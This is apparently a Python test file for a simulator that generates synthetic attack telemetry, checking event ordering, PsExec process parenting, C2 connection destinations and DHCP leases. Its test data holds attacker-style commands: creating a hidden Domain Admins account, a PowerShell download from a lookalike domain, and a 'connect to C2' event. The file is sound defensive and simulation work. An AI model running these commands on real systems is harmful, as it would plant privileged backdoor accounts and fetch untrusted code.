        base_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = base_time + timedelta(seconds=4)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process",
                process_name=r"C:\Windows\System32\net.exe",
                command_line="net user svc_mhsync MhsSvc!2024 /add /domain",
            ),
            actor=actor,
            system=source,
            time=base_time,
            activity="create privileged service account",
            explicit_types={"process", "account_created", "group_member_added"},
        )
        process_pid = engine.activity_generator._next_pid
        engine.state_manager.processes[(source.hostname, process_pid)] = SimpleNamespace(
            username=actor.username,
            logon_id="0x3e7",
            start_time=base_time,
        )
        engine.activity_generator.process_source_times[(source.hostname, process_pid)] = (
            visible_process_time
        )

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="account_created",
                target_username="svc_mhsync",
                target_sid="S-1-5-21-111-222-333-4444",
            ),
            actor=actor,
            system=source,
            time=base_time + timedelta(seconds=1),
            activity="create privileged service account",
            explicit_types={"process", "account_created", "group_member_added"},
        )
        account_create_time = engine.activity_generator.account_creates[0]["time"]

        next_command_time = engine._apply_storyline_shell_availability(
            actor=actor,
            system=source,
            time=base_time + timedelta(seconds=2),
            rng=rng,
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process",
                process_name=r"C:\Windows\System32\net.exe",
                command_line='net group "Domain Admins" svc_mhsync /add /domain',
            ),
            actor=actor,
            system=source,
            time=next_command_time,
            activity="create privileged service account",
            explicit_types={"process", "account_created", "group_member_added"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="group_member_added",
                scope="global",
                group_name="Domain Admins",
                member_name="svc_mhsync",
            ),
            actor=actor,
            system=source,
            time=base_time + timedelta(seconds=3),
            activity="create privileged service account",
            explicit_types={"process", "account_created", "group_member_added"},
        )

        assert account_create_time > visible_process_time
        assert engine.activity_generator.processes[-1]["time"] > account_create_time
        assert engine.activity_generator.group_memberships[0]["time"] > account_create_time

    def test_process_url_network_reuses_storyline_authored_domain_ip(self):
        source = System(
            hostname="DC-01",
            ip="10.10.2.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[]),
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(
                            type="connection",
                            hostname="cdn-assets-update.com",
                            dst_ip="45.33.32.30",
                        )
                    ]
                )
            ],
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="powershell.exe",
            command_line=(
                "powershell.exe -NoProfile -Command "
                "\"Invoke-WebRequest -Uri 'https://cdn-assets-update.com/health.ps1'\""
            ),
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="download health script",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[-1]
        assert conn["dst_ip"] == "45.33.32.30"
        assert conn["hostname"] == "cdn-assets-update.com"
        assert conn["preserve_dst_ip"] is True

    def test_connection_ground_truth_uses_generator_effective_destination(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 10",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator._last_connection_effective_dst_ip = "23.45.158.140"
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="connection",
            source_ip=None,
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            orig_bytes=None,
            resp_bytes=None,
            method=None,
            uri=None,
            response_body_len=None,
            description=None,
            technique=None,
            user_agent=None,
            status_code=None,
            referrer=None,
            hostname="attacker-validated.example.net",
            conn_state=None,
        )

        event = engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="connect to C2",
            explicit_types={"connection"},
        )

        assert event is not None
        assert event["dst_ip"] == "23.45.158.140"
        assert event["uid"] == "Cscptransfer00001"
        assert engine.activity_generator.connections[0]["dst_ip"] == "93.184.216.34"

    def test_recent_psexesvc_service_runs_follow_on_commands_as_system(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        service_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        engine._record_storyline_service_install(
            system=source,
            service_name="PSEXESVC",
            service_file_name=r"%SystemRoot%\PSEXESVC.exe",
            service_account="LocalSystem",
            time=service_time,
        )
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\cmd.exe",
            command_line="cmd.exe /c whoami /all",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=service_time.replace(second=2),
            activity="run remote command through psexec service",
            explicit_types={"process"},
        )

        service_proc = engine.activity_generator.processes[0]
        child_proc = engine.activity_generator.processes[1]
        assert service_proc["user"].username == "SYSTEM"
        assert service_proc["process_name"] == r"C:\Windows\PSEXESVC.exe"
        assert service_proc["parent_pid"] == 500
        assert child_proc["user"].username == "SYSTEM"
        assert child_proc["logon_id"] == "0x3e7"
        assert child_proc["parent_pid"] == 4242

    def test_old_psexesvc_service_does_not_parent_later_commands(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="SYSTEM",
            full_name="Local System",
            email="system@example.local",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        service_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        engine._record_storyline_service_install(
            system=source,
            service_name="PSEXESVC",
            service_file_name=r"%SystemRoot%\PSEXESVC.exe",
            service_account="LocalSystem",
            time=service_time,
        )
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\net.exe",
            command_line="net user svc_mhsync /delete /domain",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=service_time + timedelta(minutes=15),
            activity="later cleanup command",
            explicit_types={"process"},
        )

        assert len(engine.activity_generator.processes) == 1
        assert engine.activity_generator.processes[0]["process_name"] == (
            r"C:\Windows\System32\net.exe"
        )
        assert engine.activity_generator.processes[0]["parent_pid"] == 1

    def test_psexesvc_storyline_process_is_short_lived(self):
        """PsExec wrappers should not survive long enough to own unrelated later commands."""
        lifetime = _estimate_process_lifetime(
            r"C:\Windows\System32\PSEXESVC.exe",
            "PSEXESVC.exe -accepteula",
        )

        assert lifetime == (8.0, 45.0)
        assert (
            _estimate_process_lifetime(
                r"C:\Windows\System32\HealthMonitorSvc.exe",
                r"C:\Windows\System32\HealthMonitorSvc.exe",
            )
            is None
        )

    def test_storyline_dhcp_lease_reuses_existing_host_lease_identity(self):
        source = System(
            hostname="ROGUE-LAPTOP",
            ip="10.10.1.99",
            os="Kali Linux",
            type="workstation",
        )
        actor = User(
            username="root",
            full_name="Root",
            email="root@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(environment=SimpleNamespace(systems=[source]))
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        engine._infra_ips = {"dc": ["10.10.2.10"]}
        engine._dhcp_lease_state = {
            "ROGUE-LAPTOP": {
                "mac": "f0:1f:af:b7:35:b2",
                "lease_time": 7200.0,
                "last_renewal": 1710763200.0,
                "system": source,
            }
        }
        spec = SimpleNamespace(type="dhcp_lease", requested_ip=None, mac_address=None)

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="renew lease",
            explicit_types={"dhcp_lease"},
        )

        lease = engine.activity_generator.dhcp_leases[0]
        assert lease["mac"] == "f0:1f:af:b7:35:b2"
        assert lease["lease_time"] == 7200.0
        assert lease["msg_types"] == ["REQUEST", "ACK"]
